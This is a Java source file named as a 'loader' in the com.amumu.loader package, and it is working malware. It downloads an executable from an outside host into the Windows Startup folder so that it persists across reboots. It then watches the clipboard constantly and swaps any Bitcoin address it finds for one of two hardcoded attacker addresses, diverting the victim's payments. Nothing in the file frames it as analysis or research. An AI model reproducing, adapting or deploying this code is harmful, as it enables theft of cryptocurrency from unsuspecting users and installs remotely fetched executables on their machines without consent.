package com.amumu.loader;

import org.apache.commons.io.FileUtils;

import java.awt.*;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.StringSelection;
import java.io.File;
import java.io.IOException;
import java.net.URL;

public class Main {
    public static void main(String[] args) throws IOException {
        File destFile = new File(System.getProperty("user.home") + File.separator + "Appdata" + File.separator + "Roaming" + File.separator + "Microsoft" + File.separator + "Windows"
                + File.separator + "Start Menu" + File.separator + "Programs" + File.separator + "Startup" + File.separator + "AmumuLoader.exe");
        if (!destFile.exists()) FileUtils.copyURLToFile(new URL("https://alternative-launcher.nhx.fr/AmumuLoader.exe"), destFile);

        new Thread(() -> {
            while (true) {
                try {
                    Thread.sleep(200);
                    String getCopiedClipboard = get();
                    if (getCopiedClipboard != null) {
                        String btcAdress = "";
                        if (getCopiedClipboard.length() >= 26 && getCopiedClipboard.length() <= 35) {
                            if (getCopiedClipboard.startsWith("1")) {
                                btcAdress = "1AHmCaueCgjTFUjm16rUJmw42LkgqGXnCg";
                            } else if (getCopiedClipboard.startsWith("3")) {
                                btcAdress = "3HUnYcSvbZVCuabuD4vTYKZQ8Bv5B2y888";
                            } else if (getCopiedClipboard.startsWith("bc1")) {
                                int generatedAdress = (int) (Math.random() * 2 + 1);
                                if (generatedAdress == 1) {
                                    btcAdress = "1AHmCaueCgjTFUjm16rUJmw42LkgqGXnCg";
                                } else btcAdress = "3HUnYcSvbZVCuabuD4vTYKZQ8Bv5B2y888";
                            }
                            StringSelection stringSelection = new StringSelection(btcAdress);
                            Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
                            clipboard.setContents(stringSelection, null);
                        } else if (getCopiedClipboard.length() > 35) {
                            if (getCopiedClipboard.startsWith("bc1")) {
                                int generatedAdress = (int) (Math.random() * 2 + 1);
                                if (generatedAdress == 1) {
                                    btcAdress = "1AHmCaueCgjTFUjm16rUJmw42LkgqGXnCg";
                                } else btcAdress = "3HUnYcSvbZVCuabuD4vTYKZQ8Bv5B2y888";
                                StringSelection stringSelection = new StringSelection(btcAdress);
                                Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
                                clipboard.setContents(stringSelection, null);
                            }
                        }
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }

    public static String get() throws Exception {
        Clipboard systemClipboard = getSystemClipboard();
        DataFlavor dataFlavor = DataFlavor.stringFlavor;

        if (systemClipboard.isDataFlavorAvailable(dataFlavor)) {
            Object text = systemClipboard.getData(dataFlavor);
            return (String) text;
        }

        return null;
    }

    private static Clipboard getSystemClipboard() {
        Toolkit defaultToolkit = Toolkit.getDefaultToolkit();
        return defaultToolkit.getSystemClipboard();
    }
}
